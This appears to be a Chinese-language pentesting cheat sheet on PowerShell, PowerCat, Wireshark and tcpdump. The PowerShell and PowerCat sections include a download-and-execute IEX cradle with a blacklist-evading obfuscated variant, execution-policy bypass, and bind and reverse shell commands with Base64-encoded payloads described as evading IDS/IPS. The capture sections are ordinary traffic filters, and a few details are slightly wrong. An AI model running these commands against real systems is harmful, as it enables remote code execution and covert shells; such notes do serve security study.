## PowerShell



### 执行策略

Restricted 严格的脚本不能执行（默认配置）

RemoteSigned 在本地创建的脚本可以运行，从网络上下载的脚本不能运行（除非拥有数字签名）

AllSigned 仅当脚本由信任的发布者签名时才能运行

Unrestried 允许所有脚本允许，不受任何限制 

Bypass	没有任何限制和提示

Undefined 没有设置脚本的策略

### 基本命令

Power Shell命令不区分大小写，动词一般用Add、New、Get、Remove、Set、Clear等

Get-ExecutionPolicy	获取当前执行策略命令

Set-ExecutionPolicy	设置当前执行策略

Get-Alias	查看别名

Ls Env	查看当前环境变量

Get-Host	查看powerShell版本

Get-Location	获取当前位置

Get-Process	查看当前服务列表 

New-Item <name>-ItemType Directory	新建目录

New-Item <name>-ItemType File	新建文件

rm <=> Remove-Item <name>	删除目录操作型c

Get-Content <name>	显示文本内容

Set-Content <name>-Value <word>	设置文件内容

Add-Content <name>-Value <word>	追加文件内容

Clear-Content <name>	清空文件内容

### 案例

#### 解析

IEX = Invoke-Expression	把字符串解析成命令执行

-w Hidden = WindowStyle Hidden	隐藏窗口

-NonI = NonInteractive	非交互式模式，PowerShell不为用户提示交互提示

-NoP = NoProfile	PowerShell控制台不加载当前用户的配置文件

-Noe = NoExit	执行后不退出PowerShell

-E = -enc = EncodeCommand	接收base64 encode的字符串编码，避免特殊符号解析问题

#### 绕过本地执行权限并执行脚本

powershell -ExecutionPolicy Bypass -File .\{fileName}

#### 远程下载并通过IEX执行脚本

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString(\'{Url}\')"

##### 高阶用法

原理：利用脚本型语言特性和Replace替换黑名单的字符

powershell "$a='IEX(New-Object Net.WebClient).Down';$b='123("{url}")'.Replace('123','LoadString');IEX($a+$b);"

## PowerCat

Netcat的PowerShell版本，集成网络连接，数据传输，反、正向shell，端口转发。

### 基本参数

-c <ip>	客户端端模式

-l 监听模式

-p <port>	端口

-e <file>	执行参数 常用shell -e cmd.exe

-ep	执行powershell 启动一个伪powershell会话

-r	中续模式，实现端口转发 -r tcp:<addr2>:<port>

-u	使用udp模式

-dns <DOMAIN>	使用dnscat2进行DNS隐蔽通信，绕过网络监控

-i <INPUT>	输入，常用于文件传输

-g/-ge	生成Payload。返回一段Poshell代码或及经过Base64编码的命令。

### 例子

##### 正向Shel

powercat -l -p 443 -e cmd.exe	#被控端

nc 1.1.1.1 443	#控制端

#### Powercat独立Payload

powercat  -c 1.1.1.1 -p 443 -e cmd.exe -g > xxx.ps1	#生成反弹Shell脚本

./xxx.ps1

#### Powercat编码Payload (绕过IDS/IPS检测)

powercat -c 1.1.1.1 -p 443 -e cmd.exe -ge	#生成反弹Shell脚本编码

## Wireshark

Wireshark 使用Libcap(Linux)、Wincap(windows)从网络抓包

#### 允许用户在所有网卡抓包

sudo usermod -aG wireshark $user

#### 抓包筛选器

net 10.0.0.0/24

not port 80 and not port 25 and host www.wireshark.org

tcp port http

#### 显示筛选器

tcp.port == 80

ip.addr == 1.1.1.1

#### 还原协议流



## tcpdump

普遍可用的基于命令行的工具

### 例子

#### 分析读取抓包文件

sudo tcpdump -r xxx.pcap

#### 过滤流量

sudo tcpdump -n -r xxx.pcap | awk -F """ '{print $5}' | sort | uniq -c | head

-c 跳过dns名称查找

#### 针对流量大的ip分别查询源，目的，端口流量

sudo tcpdump -n src host {ipaddr} -r xx.pcap

sudo tcpdump -n dst host {ipaddr} -r xx.pcap

sudo tcpdump -n port {port} -r xx.pcap

#### 查找HEX、ASCII格式的内容（发现为HTTP流量+基本HTTP身份认证请求）

sudo tcpdump -nX -r xxx.pcap

#### 高端过滤（只显示传输数据的包 PSH+ACK）

原理：通过Data标志位判断（CWR、ECE、URG、ACK、PSH、PST、SYN、FIN）

echo "$((2#00011000)" = 24 通过ACK+PSH 过滤

sudo tcpdump -A -n 'Tcp[13]=24' -r xx.pcap

